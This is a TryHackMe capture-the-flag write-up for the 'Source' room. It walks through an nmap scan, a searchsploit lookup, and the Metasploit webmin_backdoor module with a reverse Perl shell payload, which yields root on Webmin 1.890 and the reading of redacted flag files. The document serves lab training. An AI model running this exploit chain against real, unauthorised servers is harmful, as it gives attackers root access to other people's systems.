# THM: Source

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/source/source.png" alt="Source" width="90"/> |
| Room | Source |
| URL | https://tryhackme.com/room/source |
| Difficulty | Easy |

## Concepts/Tools Used

- [searchsploit](/tools/searchsploit.md)
- [msfconsole](/tools/msfconsole.md)

## Room Description

Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-09 17:07 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating ARP Ping Scan at 17:07
Scanning target.thm (10.10.33.1) [1 port]
Completed ARP Ping Scan at 17:07, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:07
Scanning target.thm (10.10.33.1) [65535 ports]
Discovered open port 22/tcp on 10.10.33.1
Discovered open port 10000/tcp on 10.10.33.1
Completed SYN Stealth Scan at 17:07, 1.64s elapsed (65535 total ports)
Initiating Service scan at 17:07
Scanning 2 services on target.thm (10.10.33.1)
Completed Service scan at 17:07, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.33.1.
Initiating NSE at 17:07
Completed NSE at 17:07, 30.02s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.01s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Nmap scan report for target.thm (10.10.33.1)
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 5C9695E2F89437137C352926A05605C2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
MAC Address: 02:30:FB:D1:E4:53 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Initiating NSE at 17:07
Completed NSE at 17:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.40 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

There are only two ports open. I checked the ssh port and it does allow password authentication.

I pulled up http://target.thm:10000 and it got an error message saying that I need to run on https. I then changed the url to https://target.thm:10000. I got a login form for the site.

I tried looking up a default username and password but that didn't work. I tried running gobuster but I got locked out of the site for too many requests. So I terminated my target machine and restarted it.

From here, I took the approach I should have taken from the beginning. The nmap output told me that port 10000 is running Webmin 1.890. So I checked if there was something for this:

```bash
$ searchsploit webmin 1.890
--------------------------------------------------------------- -----------------------
Exploit Title                                                  |  Path
--------------------------------------------------------------- -----------------------
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)  | linux/webapps/47330.rb
--------------------------------------------------------------- -----------------------
Shellcodes: No Results
```

That is very interesting. Metasploit can help me get remote code execution. I start up msfconsole:

```bash
$ msfconsole
msf6 > search webmin 1.890

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   1    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   2    \_ target: Automatic (Linux Dropper)   .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'
```

I searched for the webmin 1.890 and found a few modules that will work. For the sake of simplicity I chose option 0.

```bash
msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.
```

The output above is what the module had as defaults before I made any changes. Here are the changes I made:

```bash
msf6 exploit(linux/http/webmin_backdoor) > set lhost <attack_box_ip>
lhost => 10.10.129.14
msf6 exploit(linux/http/webmin_backdoor) > set rhosts target.thm
rhosts => 10.10.254.20
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
```

Here is what my options look like now after the changes:

```bash
msf6 exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     target.thm       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <attack_box_ip>  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.
```

From here on out, I got remote code execution as root. Here are the commands I ran:

```bash
whoami
root
pwd
/usr/share/webmin
ls /home
dark
ls /home/dark
user.txt
webmin_1.890_all.deb
cat /home/dark/user.txt
REDACTED
ls /root
root.txt
cat /root/root.txt
REDACTED
```
